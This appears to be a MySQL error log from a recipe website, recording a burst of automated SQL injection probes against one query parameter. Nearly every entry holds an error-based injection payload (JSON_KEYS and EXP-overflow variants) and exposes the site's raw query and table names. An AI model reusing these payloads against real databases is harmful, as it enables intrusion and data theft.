+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'YuMz' FROM DUAL WHERE 4756=4756 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" WHERE 3561=3561 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" WHERE 3561=3561 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- FyxE=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' WHERE 5172=5172 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' WHERE 5172=5172 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- kRjl=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") WHERE 6852=6852 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") WHERE 6852=6852 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- GiZC=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:40
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') WHERE 8219=8219 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') WHERE 8219=8219 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- lUgB=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=58' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND "UrFp" LIKE "UrFp=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND ((("vaGU" LIKE "vaGU=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND (("rWQs" LIKE "rWQs=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND ("NvUb" LIKE "NvUb=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=58' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND "pYEU"="pYEU=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND ((("WazG"="WazG=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND (("AWZU"="AWZU=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND ("iqvu"="iqvu=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=58' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND 'QRpn' LIKE 'QRpn=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND ((('QwyJ' LIKE 'QwyJ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND (('mNuP' LIKE 'mNuP=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND ('WNrO' LIKE 'WNrO=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=58' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND 'ILTr'='ILTr=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND ((('kCCc'='kCCc=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND (('LiVf'='LiVf=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND ('emwO'='emwO=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=58' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- lRzx=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=58' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- sJyC=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- DKjJ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`) WHERE 4671=4671 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SE' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4`) WHERE 4671=4671 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- aLtb=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '` WHERE 7128=7128 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4` WHERE 7128=7128 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- sGCr=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AS BjRQ WHERE 6846=6846 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a62787' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AS BjRQ WHERE 6846=6846 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- oTvM=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS cniu WHERE 3200=3200 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AS cniu WHERE 3200=3200 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- Dlxv=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 5424=5424 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELEC' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 WHERE 5424=5424 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- iyIH=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 6527=6527 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELEC' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) WHERE 6527=6527 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- GJBR=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))# hHhj=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- umNg=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:31
+SQLSTATE[22032]: <<Unknown error>>: 3141 Invalid JSON text in argument 1 to function json_keys: "Invalid value." at position 0.
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND (((7223=7223=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=58' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND ((3051=3051=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:30
+SQLSTATE[22032]: <<Unknown error>>: 3141 Invalid JSON text in argument 1 to function json_keys: "Invalid value." at position 0.
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8))) AND (2453=2453=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:30
+SQLSTATE[22032]: <<Unknown error>>: 3141 Invalid JSON text in argument 1 to function json_keys: "Invalid value." at position 0.
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x716a627871,(SELECT (ELT(5892=5892,1))),0x717a766b71)) USING utf8)))-- QFUU=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' IN BOOLEAN MODE) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (E' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' IN BOOLEAN MODE) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AS PWYh WHERE 4077=4077 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(S' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AS PWYh WHERE 4077=4077 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- tpAp=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AS sdup WHERE 1294=1294 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(S' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AS sdup WHERE 1294=1294 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- SkHa=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AS XaPV WHERE 2137=2137 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AS XaPV WHERE 2137=2137 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- xBQA=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AS siwi WHERE 9484=9484 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AS siwi WHERE 9484=9484 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x))-- skYS=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT 'gabL' WHERE 7693=7693 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT 'gabL' WHERE 7693=7693 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT ufwr WHERE 3630=3630 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a62787' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'+(SELECT ufwr WHERE 3630=3630 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)))+'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'IaXB' WHERE 2927=2927 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a62' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'IaXB' WHERE 2927=2927 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(4644=4644,1))),0x717a766b71,0x78))x)))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:49:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'fTly' FROM DUAL WHERE 2297=2297 OR EXP(~(SELECT * FROM (SELECT CONCA' at line 1
